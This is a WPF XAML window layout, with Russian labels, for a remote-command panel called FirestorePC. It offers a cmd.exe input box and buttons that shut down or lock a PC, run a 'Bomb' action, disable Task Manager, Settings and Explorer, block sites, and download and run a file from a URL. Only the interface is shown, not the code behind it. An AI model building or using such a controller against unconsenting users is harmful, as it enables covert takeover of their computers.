<Window x:Class="FirestorePC.CommandWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="Command" Height="500" Width="900"
        WindowStyle="SingleBorderWindow"
        MouseLeftButtonDown="Window_MouseLeftButtonDown">
    <Grid Margin="8">
        <Grid.RowDefinitions>
            <RowDefinition Height="Auto"/>
            <RowDefinition Height="Auto"/>
            <RowDefinition Height="*"/>
            <RowDefinition Height="Auto"/>
        </Grid.RowDefinitions>

        <!-- Верхняя панель: инфо по ПК + кнопки управления окном -->
        <DockPanel Grid.Row="0" Margin="0,0,0,8">
           

            <TextBlock x:Name="StatusPC"
                       VerticalAlignment="Center"
                       FontWeight="Bold"
                       FontSize="14"/>
        </DockPanel>

        <!-- Панель: отправить команду / открыть чат -->
        <StackPanel Grid.Row="1" Orientation="Horizontal" Margin="0,0,0,8">
            <Button Content="Отправить" Width="100" Margin="0,0,8,0"
                    Click="Send_Click"/>
            <Button Content="Открыть чат" Width="110" Margin="0,0,8,0"
                    Click="OpenChat_Click"/>
            <TextBlock Text="Статус:" VerticalAlignment="Center" Margin="16,0,4,0"/>
            <TextBlock x:Name="Status" VerticalAlignment="Center" FontWeight="Bold"/>
        </StackPanel>

        <!-- Основная область: слева CMD, справа результат и пресеты команд -->
        <Grid Grid.Row="2">
            <Grid.ColumnDefinitions>
                <ColumnDefinition Width="2*"/>
                <ColumnDefinition Width="2*"/>
                <ColumnDefinition Width="3*"/>
            </Grid.ColumnDefinitions>

            <!-- Ввод команды -->
            <GroupBox Header="Команда (cmd.exe)" Margin="0,0,8,0">
                <TextBox x:Name="CmdBox"
                         AcceptsReturn="True"
                         VerticalScrollBarVisibility="Auto"
                         TextWrapping="Wrap"/>
            </GroupBox>

            <!-- Результат -->
            <GroupBox Header="Результат" Grid.Column="1" Margin="0,0,8,0">
                <TextBox x:Name="ResultBox"
                         IsReadOnly="True"
                         AcceptsReturn="True"
                         VerticalScrollBarVisibility="Auto"
                         TextWrapping="Wrap"/>
            </GroupBox>

            <!-- Пресеты команд -->
            <StackPanel Grid.Column="2">
                <GroupBox Header="Основные">
                    <WrapPanel>
                        <Button Content="Выключить ПК" Margin="2" Click="PCOFF"/>
                        <Button Content="Блокировать" Margin="2" Click="LockPC"/>
                        <Button Content="Бомба" Margin="2" Click="BombPC"/>
                        <Button Content="TaskMgr ON" Margin="2" Click="taskmgron"/>
                        <Button Content="TaskMgr OFF" Margin="2" Click="taskmgroff"/>
                        <Button Content="Settings ON" Margin="2" Click="settingson"/>
                        <Button Content="Settings OFF" Margin="2" Click="settingsoff"/>
                        <Button Content="Explorer ON" Margin="2" Click="exploreron"/>
                        <Button Content="Explorer OFF" Margin="2" Click="exploreroff"/>
                        <Button Content="Restart with admin" Margin="2" Click="buttonRestartAsAdmin_Click"/>

                    </WrapPanel>
                </GroupBox>

                <GroupBox Header="Сеть / браузер" Margin="0,4,0,0">
                    <StackPanel>
                        <Button Content="Мой YouTube" Margin="0,0,0,4" Click="OpenMyTube"/>
                        <Button Content="tracert google.com" Margin="0,0,0,4" Click="TrackIP"/>
                        <Button Content="IP info (ipinfo.io)" Margin="0,0,0,4" Click="InfoIP"/>

                        <StackPanel Orientation="Horizontal" Margin="0,4,0,0">
                            <TextBox x:Name="OpenWebsiteTextBox"
                                     Width="160"
                                     Margin="0,0,4,0"
                                     ToolTip="https://example.com"/>
                            <Button Content="Открыть сайт" Width="110"
                                    Click="OpenWebsiteButton_Click"/>
                        </StackPanel>

                        <StackPanel Orientation="Horizontal" Margin="0,4,0,0">
                            <TextBox x:Name="BlockWebsiteTextBox"
                                     Width="160"
                                     Margin="0,0,4,0"
                                     ToolTip="site.com"/>
                            <Button Content="Блокировать сайт"
                                    Width="110"
                                    Click="BlockWebsiteButton_Click"/>
                        </StackPanel>

                        <StackPanel Orientation="Horizontal" Margin="0,4,0,0">
                            <TextBox x:Name="DownloadRunTextBox"
                                     Width="160"
                                     Margin="0,0,4,0"
                                     ToolTip="URL файла"/>
                            <Button Content="Скачать" Width="110"
                                    Click="DownloadRunButton_Click"/>
                        </StackPanel>
                    </StackPanel>
                </GroupBox>

                <GroupBox Header="Разное" Margin="0,4,0,0">
                    <StackPanel>
                        <StackPanel Orientation="Horizontal" Margin="0,2,0,0">
                            <TextBox x:Name="TextToSpeechTextBox"
                                     Width="160"
                                     Margin="0,0,4,0"
                                     ToolTip="Текст для речи"/>
                            <Button Content="Text-to-Speech"
                                    Width="120"
                                    Click="TextToSpeechButton_Click"/>
                        </StackPanel>

                        <StackPanel Orientation="Horizontal" Margin="0,4,0,0">
                            <TextBox x:Name="MessageBoxTextBox"
                                     Width="160"
                                     Margin="0,0,4,0"
                                     ToolTip="Текст окна"/>
                            <Button Content="MessageBox"
                                    Width="120"
                                    Click="MessageBoxButton_Click"/>
                        </StackPanel>
                    </StackPanel>
                </GroupBox>
            </StackPanel>
        </Grid>

        <!-- Подвал, можно оставить пустым или под подсказки -->
        <TextBlock Grid.Row="3" Text="" />
    </Grid>
</Window>
